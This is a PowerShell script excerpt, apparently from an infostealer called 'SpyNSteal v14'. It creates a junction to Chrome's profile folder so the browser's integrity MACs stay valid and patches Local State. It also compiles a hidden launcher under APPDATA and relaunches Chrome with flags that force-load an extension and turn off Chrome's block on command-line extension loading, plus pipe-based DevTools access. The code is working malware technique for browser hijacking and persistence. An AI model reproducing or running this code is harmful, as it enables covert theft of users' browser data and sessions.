# SpyNSteal v14 - Junction profile + pipe CDP + cmd.exe launch hooks
# Chrome MACs include profile path; temp junction paths break on normal restart.
# Permanent User Data_Ext junction -> same files, stable path for MACs + --user-data-dir
...
function Ensure-ProfileJunction([string]$realUserData) {
    $parent = Split-Path $realUserData -Parent
    $junction = Join-Path $parent "User Data_Ext"
    if (Test-Path $junction) {
        $item = Get-Item $junction -Force -EA SilentlyContinue
        if ($item.Attributes -band [IO.FileAttributes]::ReparsePoint) { return $junction }
        Remove-Item $junction -Recurse -Force -EA SilentlyContinue
    }
    $mk = cmd /c mklink /J "$junction" "$realUserData" 2>&1
    if (Test-Path $junction) { return $junction }
    return $null
}

function Start-ChromeWithExtension([string]$chromeExe, [string]$profileDir, [string]$extDir, [string]$extId) {
    $loadDir = $extDir
    if ($extId) {
        $inProfile = Join-Path $profileDir "Default\Extensions\$extId\1.0_0"
        if (Test-Path (Join-Path $inProfile "manifest.json")) { $loadDir = $inProfile }
    }
    $argList = @(
    ...
    Log "Start-Chrome load-extension=$loadDir"
    Start-Process -FilePath $chromeExe -ArgumentList $argList | Out-Null
}

function Build-ChromeLaunchExe([string]$chromeExe, [string]$profileDir, [string]$loadDir) {
    $baseDir = Join-Path $env:APPDATA "CRSched"
    $exePath = Join-Path $baseDir "ChromeLaunch.exe"
    $csPath = Join-Path $baseDir "ChromeLaunch.cs"

    $cEsc = $chromeExe.Replace('\', '\\')
    $pEsc = $profileDir.Replace('\', '\\')
    $lEsc = $loadDir.Replace('\', '\\')
...
public static class ChromeLaunch {
    public static void Main(string[] args) {
        try {
            ...
            psi.FileName = @"$cEsc";
            psi.Arguments = @"--user-data-dir=""$pEsc"" --restore-last-session --enable-unsafe-extension-debugging --disable-features=DisableLoadExtensionCommandLineSwitch --load-extension=""$lEsc""";
            psi.UseShellExecute = false;
            Process.Start(psi);
...
function Write-ChromeLauncher([string]$chromeExe, [string]$profileDir, [string]$extDir, [string]$extId) {
    $baseDir = Join-Path $env:APPDATA "CRSched"
    ...
    $inProfile = ""
    if ($extId) { $inProfile = Join-Path $profileDir "Default\Extensions\$extId\1.0_0" }
...
try {
    ...
    `$extSrc = '$($extDir.Replace("'", "''"))'
    `$extProfile = '$($inProfile.Replace("'", "''"))'
    `$loadDir = `$extSrc
    if (`$extProfile -and (Test-Path (Join-Path `$extProfile 'manifest.json'))) { `$loadDir = `$extProfile }
    L "load-extension=`$loadDir"
    `$argList = @(
...
$profileDir = Ensure-ProfileJunction $origPath
if (-not $profileDir) {
    Log "FATAL: Could not create User Data_Ext junction"
    exit
}
Log "Stable profile path: $profileDir"

Patch-LocalState $profileDir

Log "Pipe CDP install on stable junction profile..."
...
$loadDir = $extDirAbs
if ($extId) {
    $inProf = Join-Path $profileDir "Default\Extensions\$extId\1.0_0"
    if (Test-Path (Join-Path $inProf "manifest.json")) { $loadDir = $inProf }
}

$launchExe = Build-ChromeLaunchExe $target.ExePath $profileDir $loadDir
$launcher = Write-ChromeLauncher $target.ExePath $profileDir $extDirAbs $extId
...
Log "Relaunching Chrome (direct Start-Process)..."
Start-ChromeWithExtension $target.ExePath $profileDir $extDirAbs $extId
Start-Sleep 5
...
if ($chromeRunning) {
    ...
    if ($proc -and $proc.CommandLine) {
        $hasProfile = $proc.CommandLine -like "*User Data_Ext*"
        $hasLoad = $proc.CommandLine -like "*load-extension*"
        Log "  cmdline has User Data_Ext: $hasProfile"
